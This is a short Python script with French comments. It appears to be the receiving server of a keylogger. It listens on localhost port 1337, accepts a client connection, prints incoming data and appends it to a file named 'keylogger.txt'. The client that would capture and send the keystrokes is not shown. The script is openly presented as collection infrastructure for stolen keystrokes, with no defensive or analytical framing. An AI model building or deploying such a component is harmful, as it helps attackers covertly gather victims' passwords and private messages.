import socket
import os

host = 'localhost'
port = 1337


def start_server():
    # Création du socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # Liaison du socket
    s.bind((host, port))
    # Ecoute sur le socket
    s.listen(5)
    # Getting client socket
    conn, addr = s.accept()
    # Affichage de l'adresse du client
    print('New connection from: ', addr)

    # Afficher ce que l'on reçoit du client
    while True:
        data = conn.recv(1024)
        with open('Réception/keylogger.txt', 'ab') as file:
            file.write(data)
        if not data:
            break
        print('Received from client: ', data.decode('utf-8'))


    # Fermeture de la connexion
    conn.close()
    # Fermeture du socket
    s.close()

if __name__ == '__main__':
    start_server()
